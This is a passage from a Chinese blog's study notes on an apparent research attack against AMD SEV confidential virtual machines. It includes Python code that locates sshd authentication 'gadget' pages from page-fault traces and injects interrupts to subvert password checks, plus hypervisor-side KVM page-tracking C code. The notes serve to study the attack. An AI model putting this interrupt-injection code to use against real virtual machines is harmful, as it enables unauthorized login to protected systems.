<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">XXX:</span> this approach ignores the back jump from</span></span><br><span class="line"><span class="comment"># auth_password -&gt; mm_answer_authpassword and tries to find the gadgets</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># for some CVM, we do not find a direct backjump but a strange</span></span><br><span class="line"><span class="comment"># ping pong pattern of auth_password and some other page even though the backjump</span></span><br><span class="line"><span class="comment"># should only be occurring once in a perfect trace sequence</span></span><br><span class="line"><span class="comment"># mm_answer_authpassword -&gt; auth_password .... backjump: auth_password -&gt; mm_answer_authpassword.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># instead, auth_password ping pongs with some other page until max_hit is reached.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># this is puzzling and may be caused by spurious page faults</span></span><br><span class="line"><span class="comment"># this function is a workaround and tries to find gadget page with no distinct</span></span><br><span class="line"><span class="comment"># auth_password -&gt; mm_answer_authpassword backjump.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_find_no_direct_backjump</span>(<span class="params">run_list, run_set,</span></span><br><span class="line"><span class="params">                            gt_auth_password,</span></span><br><span class="line"><span class="params">                            gt_mm_answer_authpassword,</span></span><br><span class="line"><span class="params">                            debug=<span class="literal">False</span></span>):</span><br><span class="line">    auth_password_list = []</span><br><span class="line">    mm_answer_authpassword_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> run_set:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">6</span> &lt;= run_list.count(addr) &lt;= <span class="number">9</span>:</span><br><span class="line">            mm_answer_authpassword_list.append(addr)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">30</span> &lt;= run_list.count(addr) &lt;= <span class="number">30</span>:</span><br><span class="line">            auth_password_list.append(addr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;no direct: auth_password_list: <span class="subst">&#123;<span class="built_in">len</span>(auth_password_list)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;no direct: mm_answer_authpassword_list: <span class="subst">&#123;<span class="built_in">len</span>(mm_answer_authpassword_list)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    candidates = []</span><br><span class="line">    <span class="keyword">for</span> auth_password <span class="keyword">in</span> auth_password_list:</span><br><span class="line">        <span class="keyword">for</span> mm_answer_authpassword <span class="keyword">in</span> mm_answer_authpassword_list:</span><br><span class="line">            num_found = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> auth_password == mm_answer_authpassword:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(run_list) - <span class="number">1</span>):</span><br><span class="line">                <span class="comment"># mm_anser_authpasswd -&gt; auth_pwd .... mm_anser_authpasswd</span></span><br><span class="line">                <span class="keyword">if</span> run_list[i] == mm_answer_authpassword <span class="keyword">and</span> \</span><br><span class="line">                        run_list[i + <span class="number">1</span>] == auth_password:</span><br><span class="line">                    <span class="comment"># first auth_password in list</span></span><br><span class="line">                    <span class="keyword">if</span> run_list[:i + <span class="number">1</span>].count(auth_password) == <span class="number">0</span>:</span><br><span class="line">                        j = i + <span class="number">1</span></span><br><span class="line">                        <span class="keyword">while</span> j &lt; <span class="built_in">len</span>(run_list):</span><br><span class="line">                            <span class="keyword">if</span> run_list[j] == mm_answer_authpassword:</span><br><span class="line">                                num_found += <span class="number">1</span></span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                            j = j + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># combination must be unique</span></span><br><span class="line">            <span class="keyword">if</span> num_found == <span class="number">1</span>:</span><br><span class="line">                candidates.append((mm_answer_authpassword, auth_password))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> candidates</span><br></pre></td></tr></table></figure>

<p>runlist里面出现6-9次的gpa是mm_answer_authpassword备选 30次是auth_password备选</p>
<p>互相组合 需要满足mm_anser_authpasswd -&gt; auth_pwd …. mm_anser_authpasswd  即可</p>
<p>看起来不是特别靠谱 但是可以多跑几次取交集</p>
<h3 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">inject</span>(<span class="params">self, gadget_pairs, quit_after_one_inject=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        gadget_pairs: (mm_answer_authpassword, auth_password)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.do_page_tracking = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        lastlast_gpa = <span class="number">0</span></span><br><span class="line">        last_gpa = <span class="number">0</span></span><br><span class="line">        h.heckler_init()</span><br><span class="line"></span><br><span class="line">        h.heckler_enable_tracking()</span><br><span class="line">        h.heckler_untrack_all_pages()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> gadgets <span class="keyword">in</span> gadget_pairs:</span><br><span class="line">            gad1 = gadgets[<span class="number">0</span>]</span><br><span class="line">            gad2 = gadgets[<span class="number">1</span>]</span><br><span class="line">            h.heckler_track_page(gad1)</span><br><span class="line">            h.heckler_track_page(gad2)</span><br><span class="line"></span><br><span class="line">        history = &#123;&#125;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Attack active. Waiting for target gadgets...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        acked = <span class="literal">True</span></span><br><span class="line">        errors = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> self.do_page_tracking:</span><br><span class="line">                acked = <span class="literal">False</span></span><br><span class="line">                ev = h.heckler_block_until_event()</span><br><span class="line">                <span class="keyword">if</span> ev <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> ev.get(<span class="string">&#x27;ret&#x27;</span>) == <span class="number">1</span> <span class="keyword">or</span> ev.get(<span class="string">&#x27;gpa&#x27;</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> ev <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">if</span> ev.get(<span class="string">&#x27;ret&#x27;</span>) == h.HECKLER_ERR_ABORT:</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                    errors = errors + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> errors &gt; <span class="number">300</span>:</span><br><span class="line">                        <span class="built_in">print</span>(ev)</span><br><span class="line">                        <span class="built_in">print</span>(errors)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        h.heckler_ack_event()</span><br><span class="line">                        acked = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                gpa = <span class="built_in">int</span>(ev.get(<span class="string">&#x27;gpa&#x27;</span>))</span><br><span class="line"></span><br><span class="line">                track_again = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> lastlast_gpa != <span class="number">0</span> <span class="keyword">and</span> last_gpa != <span class="number">0</span> <span class="keyword">and</span> gpa != <span class="number">0</span>:</span><br><span class="line">                    key = (lastlast_gpa, last_gpa, gpa)</span><br><span class="line">                    <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> history:</span><br><span class="line">                        history[key] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">                    history[key] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> history[key] &gt; <span class="number">3</span>:</span><br><span class="line">                        track_again = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;sequence \[<span class="subst">&#123;<span class="built_in">hex</span>(lastlast_gpa)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(last_gpa)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(gpa)&#125;</span>]&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> gadgets <span class="keyword">in</span> gadget_pairs:</span><br><span class="line">                    mm_answer_authpassword = gadgets[<span class="number">0</span>]</span><br><span class="line">                    auth_password = gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># sequence of interest:</span></span><br><span class="line">                    <span class="comment"># mm_answer_authpassword -&gt; auth_password -&gt; mm_answer_authpassword</span></span><br><span class="line">                    <span class="keyword">if</span> gpa == mm_answer_authpassword \</span><br><span class="line">                            <span class="keyword">and</span> last_gpa == auth_password \</span><br><span class="line">                            <span class="keyword">and</span> lastlast_gpa == mm_answer_authpassword:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Injecting interrupt, sequence &quot;</span></span><br><span class="line">                              <span class="string">f&quot;\[<span class="subst">&#123;<span class="built_in">hex</span>(lastlast_gpa)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(last_gpa)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(gpa)&#125;</span>]&quot;</span>)</span><br><span class="line">                        h.heckler_inject(<span class="number">0x80</span>)</span><br><span class="line">                        <span class="keyword">if</span> quit_after_one_inject:</span><br><span class="line">                            self.do_page_tracking = <span class="literal">False</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> last_gpa != gpa <span class="keyword">and</span> last_gpa != <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> track_again:</span><br><span class="line">                        h.heckler_track_page(last_gpa)</span><br><span class="line"></span><br><span class="line">                lastlast_gpa = last_gpa</span><br><span class="line">                last_gpa = gpa</span><br><span class="line">                h.heckler_ack_event()</span><br><span class="line">                acked = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> acked:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                h.heckler_ack_event()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(e)</span><br><span class="line">        h.heckler_untrack_all_pages()</span><br><span class="line">        h.heckler_clean_up()</span><br><span class="line">        self.do_page_tracking = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>这里为什么又是三个连续的了？每次循环的GPA是否pc是连续的？ single step还是根据条件</p>
<h3 id="track-page"><a href="#track-page" class="headerlink" title="track page"></a>track page</h3><p>user</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">track_page</span><span class="params">(<span class="type">usp_poll_api_ctx_t</span>* ctx, <span class="type">uint64_t</span> gpa, <span class="keyword">enum</span> kvm_page_track_mode mode)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">track_page_param_t</span> tp = &#123;</span><br><span class="line">		.gpa = gpa,</span><br><span class="line">		.track_mode = mode,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">if</span> (ioctl(ctx-&gt;kvm_fd, KVM_TRACK_PAGE, &amp;tp) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;track_page: Error calling KVM_TRACK_PAGE ioctl&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> SEV_STEP_ERR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> SEV_STEP_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>kvm:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __ioctl_track_page(<span class="keyword">struct</span> file *f, <span class="type">void</span> *a) &#123;</span><br><span class="line">    <span class="type">track_page_param_t</span> p;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_vcpu</span> *<span class="title">vcpu</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;p, (<span class="type">void</span> *)a, <span class="keyword">sizeof</span>(p))) &#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    pr_info(<span class="string">&quot;tracking page %llx\n&quot;</span>, p.gpa &gt;&gt; PAGE_SHIFT);</span><br><span class="line">    vcpu = xa_load(&amp;heckler_config.main_vm-&gt;vcpu_array, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    __do_track_single_page(</span><br><span class="line">        vcpu,</span><br><span class="line">        p.gpa &gt;&gt; PAGE_SHIFT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// <span class="doctag">XXX:</span> Add page to NX page_track tracking</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> __do_track_single_page(<span class="keyword">struct</span> kvm_vcpu *vcpu, <span class="type">gfn_t</span> gfn) &#123;</span><br><span class="line">    <span class="type">bool</span> ret;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_memory_slot</span> *<span class="title">slot</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">kvm_page_track_mode</span> <span class="title">mode</span> =</span> KVM_PAGE_TRACK_EXEC;</span><br><span class="line"></span><br><span class="line">    idx = srcu_read_lock(&amp;vcpu-&gt;kvm-&gt;srcu);</span><br><span class="line">    slot = kvm_vcpu_gfn_to_memslot(vcpu, gfn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (slot != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">        !kvm_slot_page_track_is_active(vcpu-&gt;kvm, slot, gfn, mode)) &#123;</span><br><span class="line">        kvm_slot_page_track_add_page(vcpu-&gt;kvm, slot, gfn, mode);</span><br><span class="line">        kvm_vcpu_exec_protect_gfn(vcpu, gfn, <span class="literal">true</span>);</span><br><span class="line">        ret = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">kvm_vcpu_exec_protect_gfn</span><span class="params">(<span class="keyword">struct</span> kvm_vcpu *vcpu, u64 gfn, <span class="type">bool</span> flush)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kvm_memory_slot</span> *<span class="title">slot</span>;</span></span><br><span class="line">	<span class="type">bool</span> protected;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	slot = kvm_vcpu_gfn_to_memslot(vcpu, gfn);</span><br><span class="line">	protected = kvm_mmu_slot_gfn_protect(vcpu-&gt;kvm, slot, gfn, PG_LEVEL_4K, KVM_PAGE_TRACK_EXEC);</span><br><span class="line">	<span class="keyword">if</span> (flush &amp;&amp; protected) &#123;</span><br><span class="line">		kvm_flush_remote_tlbs(vcpu-&gt;kvm);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> protected;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">kvm_mmu_slot_gfn_protect</span><span class="params">(<span class="keyword">struct</span> kvm *kvm,</span></span><br><span class="line"><span class="params">				    <span class="keyword">struct</span> kvm_memory_slot *slot, u64 gfn,</span></span><br><span class="line"><span class="params">				    <span class="type">int</span> min_level,</span></span><br><span class="line"><span class="params">					<span class="keyword">enum</span> kvm_page_track_mode mode)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kvm_rmap_head</span> *<span class="title">rmap_head</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">bool</span> protected = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (kvm_memslots_have_rmaps(kvm)) &#123; </span><br><span class="line">		<span class="keyword">for</span> (i = min_level; i &lt;= KVM_MAX_HUGEPAGE_LEVEL; ++i) &#123;</span><br><span class="line">			rmap_head = gfn_to_rmap(gfn, i, slot);</span><br><span class="line">			protected |= __rmap_protect(kvm, rmap_head, <span class="literal">true</span>, mode);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	WARN(is_tdp_mmu_enabled(kvm), <span class="string">&quot;exec protect not supported with TDP MMU&quot;</span>);	</span><br><span class="line">	<span class="keyword">return</span> protected;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> __rmap_protect(<span class="keyword">struct</span> kvm *kvm,</span><br><span class="line">				 <span class="keyword">struct</span> kvm_rmap_head *rmap_head,</span><br><span class="line">				 <span class="type">bool</span> pt_protect, <span class="keyword">enum</span> kvm_page_track_mode mode)</span><br><span class="line">&#123;</span><br><span class="line">	u64 *sptep;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rmap_iterator</span> <span class="title">iter</span>;</span></span><br><span class="line">	<span class="type">bool</span> flush = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	for_each_rmap_spte(rmap_head, &amp;iter, sptep)</span><br><span class="line">		flush |= spte_protect(sptep, pt_protect, mode);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> flush;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">spte_protect</span><span class="params">(u64 *sptep, <span class="type">bool</span> pt_protect,</span></span><br><span class="line"><span class="params">	<span class="keyword">enum</span> kvm_page_track_mode mode)</span></span><br><span class="line">&#123;</span><br><span class="line">	u64 spte = *sptep;</span><br><span class="line">	<span class="type">bool</span> shouldFlush = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!is_writable_pte(spte) &amp;&amp;</span><br><span class="line">	    !(pt_protect &amp;&amp; is_mmu_writable_spte(spte)))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	rmap_printk(<span class="string">&quot;spte %p %llx\n&quot;</span>, sptep, *sptep);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pt_protect)</span><br><span class="line">		spte &amp;= ~EPT_SPTE_MMU_WRITABLE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(mode == KVM_PAGE_TRACK_WRITE) &#123;</span><br><span class="line">		spte = spte &amp; ~PT_WRITABLE_MASK;</span><br><span class="line">		shouldFlush = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>( mode == KVM_PAGE_TRACK_RESET_ACCESSED) &#123;</span><br><span class="line">		spte = spte &amp; ~PT_ACCESSED_MASK;</span><br><span class="line">		shouldFlush = <span class="literal">true</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>(mode == KVM_PAGE_TRACK_ACCESS) &#123;</span><br><span class="line">		spte = spte &amp; ~PT_PRESENT_MASK;</span><br><span class="line">		spte = spte &amp; ~PT_WRITABLE_MASK;</span><br><span class="line">		spte = spte &amp; ~PT_USER_MASK;</span><br><span class="line">		spte = spte | (<span class="number">0x1</span>ULL &lt;&lt; PT64_NX_SHIFT);</span><br><span class="line">		shouldFlush = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>		</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>( mode == KVM_PAGE_TRACK_EXEC) &#123;</span><br><span class="line">		spte = spte | (<span class="number">0x1</span>ULL &lt;&lt; PT64_NX_SHIFT); </span><br><span class="line">		shouldFlush = <span class="literal">true</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == KVM_PAGE_TRACK_RESET_EXEC) &#123;</span><br><span class="line">		spte = spte &amp; (~(<span class="number">0x1</span>ULL &lt;&lt; PT64_NX_SHIFT));</span><br><span class="line">		shouldFlush = <span class="literal">true</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		printk(KERN_WARNING <span class="string">&quot;spte_protect was called with invalid mode&quot;</span></span><br><span class="line">		<span class="string">&quot;parameter %d\n&quot;</span>,mode);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	shouldFlush |= mmu_spte_update(sptep, spte);</span><br><span class="line">	<span class="keyword">return</span> shouldFlush;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>track_page的核心就是把present bit给清零 这样每次都会触发page fault</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/05/04/papers/cipherH/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/04/papers/cipherH/" class="post-title-link" itemprop="url">CipherH</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-05-04 15:40:59 / Modified: 15:41:51" itemprop="dateCreated datePublished" datetime="2024-05-04T15:40:59+08:00">2024-05-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>6.1k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
